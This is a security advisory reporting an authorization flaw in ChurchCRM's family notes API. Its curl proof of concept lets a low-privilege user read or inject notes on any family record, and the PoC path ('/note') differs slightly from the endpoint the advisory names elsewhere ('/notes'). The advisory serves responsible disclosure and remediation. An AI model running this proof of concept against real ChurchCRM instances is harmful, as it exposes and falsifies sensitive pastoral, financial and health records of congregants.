# IDOR on Family Notes — Cross-Family Unauthorized Access

**Product:** ChurchCRM  
**Version:** 7.3.3 (earlier versions likely affected)  
**CVE:** Pending  
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key  
**Severity:** Medium  
**CVSS 4.0:** 5.3 — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N`  
**Discovered:** 2026-06-10  
**Author:** Caio Chagas  

---

## Description

The family notes API endpoints (`GET` and `POST /api/family/{id}/notes`) perform no object-level authorization. Any user with the Notes role can read or create notes on any family record in the system by supplying an arbitrary family ID.

## Root Cause

Same structural issue as the person notes IDOR (VULN-02): the route in `api/routes/people/notes.php` checks role membership via `NotesRoleAuthMiddleware` but never verifies whether the requester belongs to the target family or holds any relationship to it. The family ID comes directly from the URL and is passed to the query without further validation.

## Impact

- Read: enumerate all family IDs and extract every public note recorded by staff across all families
- Write: inject notes into any family record — including fabricating pastoral or administrative entries
- Notes about families may contain sensitive information: financial situations, health concerns, legal matters, or counseling records

## Proof of Concept

```bash
# Step 1 — authenticate
curl -s -c cookies.txt -X POST "http://TARGET/churchcrm/session/begin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "User=lowpriv&Password=lowpass123"

# Step 2 — create a note on an arbitrary family (family ID 1)
curl -s -b cookies.txt -X POST "http://TARGET/churchcrm/api/family/1/note" \
  -H "Content-Type: application/json" \
  -d '{"text":"unauthorized note","private":false}'

# Step 3 — read notes for that family
curl -s -b cookies.txt "http://TARGET/churchcrm/api/family/1/notes"
```

**Expected response (POST):**
```
HTTP 201 Created
```

The note is created and readable under the target family despite the requester having no association with it.

## Evidence

![Proof of concept](assets/poc.png)
<!-- Add video or additional screenshots to assets/ -->

## Affected Component

| Field | Value |
|-------|-------|
| Endpoint | `GET /api/family/{id}/notes`, `POST /api/family/{id}/notes` |
| File | `api/routes/people/notes.php` |
| Middleware | `NotesRoleAuthMiddleware` (role check only, no entity check) |
| Auth required | Yes — Notes role |

## Timeline

| Date | Event |
|------|-------|
| 2026-06-10 | Vulnerability discovered and confirmed |
| 2026-06-10 | Vendor notified via GitHub Security Advisories |
| TBD | CVE ID assigned |
| TBD | Patch released |
| TBD | Public disclosure |

## Remediation

Verify that the requesting user belongs to the target family or holds an explicit administrative/pastoral role before granting read or write access to family notes. The fix should be applied to both the person and family note routes in the same pass (see also VULN-02).

## References

- [ChurchCRM source](https://github.com/ChurchCRM/CRM)
- [Affected file](https://github.com/ChurchCRM/CRM/blob/master/api/routes/people/notes.php)
